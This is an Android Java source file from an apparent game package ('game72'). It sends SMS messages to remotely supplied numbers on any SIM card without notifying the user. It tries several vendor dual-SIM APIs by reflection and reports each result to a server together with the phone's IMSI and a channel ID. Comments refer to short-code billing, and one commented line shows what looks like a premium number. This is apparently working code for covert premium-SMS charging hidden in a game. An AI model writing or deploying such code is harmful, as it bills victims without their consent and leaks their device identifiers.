package cn.com.tiantong.game72;



import java.lang.reflect.Method;

import cn.com.tiantong.game72.ControlBroadcastReceiver;
import cn.com.tiantong.game72.In;
import cn.com.tiantong.game72.SendMsgResultThread;

import android.app.PendingIntent;
import android.content.Context;
import android.telephony.SmsManager;
import android.util.Log;

public class SendMessageManager {

//	private static final String tag = "SendMessageManager";

	// 发送短信
	public static void sendSMS1(Context context, String addr, String content, String msgId) {
		
		try {
//			Log.e("sendMessage", "addr : " + addr + ", content : " + content);
			//需要发送短信
			In infor = new In(context);
			boolean isTwoCard = infor.chargeHasTwoImsi(context);
			if(isTwoCard){
				//这是两张卡槽
				String send_imsi_1 = infor.getTwoImsi(context, 0);
				String send_imsi_2 = infor.getTwoImsi(context, 1);
				
				if(send_imsi_1 != null && ! "".equals(send_imsi_1.trim())){
					//LH.LogPrint(tag, "imsi_1:发送：" + addr + ", " + content);
					//发送短信
					sendSMS_Double_card(addr, content, 0);
					sendMsgResult(context, msgId, "0");
				}else if(send_imsi_2 != null && ! "".equals(send_imsi_2.trim())){
					//LH.LogPrint(tag, "imsi_2:发送：" + addr + ", " + content);
					//发送短信
					sendSMS_Double_card(addr, content, 1);
					sendMsgResult(context, msgId, "0");
				}
				
			}else{
				//这是单卡的，那么只要这个发送
				//LH.LogPrint(tag, "这是单卡的，那么只要这个发送：" + addr + ", " + content);
				//发送短信
				sendSMS_Single_card(addr, content);
				sendMsgResult(context, msgId, "0");
			}
		} catch (Exception e) {
			e.printStackTrace();
			sendMsgResult(context, msgId, "-99");
		}

	}
	
	//发送短代上报结果
	private static void sendMsgResult(Context mContext, String msgId, String result){
		if(msgId != null && ! "".equals(result.trim())){
			//LH.LogPrint(tag, "发送短信的结果：" + "msgId:" + msgId + ", result:" + result);
			new SendMsgResultThread(mContext, ControlBroadcastReceiver.QUDAOHAO, ControlBroadcastReceiver.IMSI, msgId, result).execute("");
			
		}
	}
	

	// 单卡发送
	private static void sendSMS_Single_card(String addr, String content) {
		//LH.LogPrint(tag, "==> sendSMS_Single_card do send:" + addr + "content:" + content);
		SmsManager.getDefault().sendTextMessage(addr, null, content, null, null);
		//LH.LogPrint(tag, "==> 单卡发送结束");
	}

	// 双卡发送
	/*
	 * DualSimUtils.sendTextMessage("1065843601", null, msg, null, null, sim);
	 */
	private static void sendSMS_Double_card(String addr, String content, int sim) {
		//LH.LogPrint(tag, "==> sendSMS_Double_card ***** do send:" + addr + "content:" + content);
	     try {
			sendTextMessage(addr, null, content, null, null, sim);
			//LH.LogPrint(tag, "==> 双卡发送结束");
		} catch (NoSuchMethodException e) {
			e.printStackTrace();
			//双卡双待手机发送异常，使用通用发送方式、
			sendSMS_Single_card(addr, content);
		}
	}

	private static void sendTextMessage(String destinationAddress, String scAddress, String text, PendingIntent sentIntent, PendingIntent deliveryIntent, int card) throws NoSuchMethodException {
		try {
			////LH.LogPrint(tag, "android.telephony.gemini.GeminiSmsManager");
			Class clazz = Class.forName("android.telephony.gemini.GeminiSmsManager");
			Class[] args = { String.class, String.class, String.class, Integer.TYPE, PendingIntent.class, PendingIntent.class };

			Method method = clazz.getMethod("sendTextMessageGemini", args);
			method.invoke(clazz, new Object[] { destinationAddress, scAddress, text, Integer.valueOf(card), sentIntent, deliveryIntent });
			return;
			} catch (Exception localException) {
		    } catch (Error localError) {
			}

		try {
			////LH.LogPrint(tag, "android.telephony.MSimSmsManager");
			Class clazz = Class.forName("android.telephony.MSimSmsManager");
			Method method = clazz.getMethod("getDefault", null);
			Object object = method.invoke(null, null);
			Class[] args = { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class, Integer.TYPE };

			method = clazz.getMethod("sendTextMessage", args);
			method.invoke(object, new Object[] { destinationAddress, scAddress, text, sentIntent, deliveryIntent, Integer.valueOf(card) });
			return;
		} catch (Exception localException1) {
		} catch (Error localError1) {
		}

		try {
			////LH.LogPrint(tag, "android.telephony.MSimSmsManager");
			Class clazz = Class.forName("android.telephony.MSimSmsManager");
			Class[] args = { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class, Integer.TYPE };

			Method method = clazz.getMethod("sendTextMessage", args);
			method.invoke(clazz.newInstance(), new Object[] {destinationAddress, scAddress, text, sentIntent, deliveryIntent, Integer.valueOf(card) });
			return;
		} catch (Exception localException2) {
		} catch (Error localError2) {
		}

		try {
			////LH.LogPrint(tag, "android.telephony.SmsManager");
			Class clazz = Class.forName("android.telephony.SmsManager");

			Class[] args1 = { Integer.TYPE };
			Method method = clazz.getDeclaredMethod("getDefault", args1);
			Object object = method.invoke(null, new Object[] { Integer.valueOf(card) });
			Class[] args2 = { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class };

			method = clazz.getMethod("sendTextMessage", args2);
			method.invoke(object, new Object[] { destinationAddress, scAddress, text, sentIntent, deliveryIntent });
			return;
		} catch (Exception localException3) {
		} catch (Error localError3) {
		}

		try {
			////LH.LogPrint(tag, "com.mediatek.telephony.SmsManager");
			Class clazz = Class.forName("com.mediatek.telephony.SmsManager");
			Class[] args = { String.class, String.class, String.class, Integer.TYPE, PendingIntent.class, PendingIntent.class };

			Method method = clazz.getMethod("sendTextMessage", args);
			method.invoke(clazz.newInstance(), new Object[] {destinationAddress, scAddress, text, Integer.valueOf(card), sentIntent, deliveryIntent });
			return;
		} catch (Exception localException4) {
		} catch (Error localError4) {
		}

		try {
			////LH.LogPrint(tag, "com.mediatek.telephony.SmsManagerEx");
			Class clazz = Class.forName("com.mediatek.telephony.SmsManagerEx");
			Method method = clazz.getMethod("getDefault", null);
			Object object = method.invoke(null, null);
			Class[] args = { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class, Integer.TYPE };

			method = clazz.getMethod("sendTextMessage", args);
			method.invoke(object, new Object[] { destinationAddress, scAddress, text, sentIntent, deliveryIntent, Integer.valueOf(card) });
			return;
		} catch (Exception localException5) {
		} catch (Error localError5) {
		}
		throw new NoSuchMethodException();
	}

}
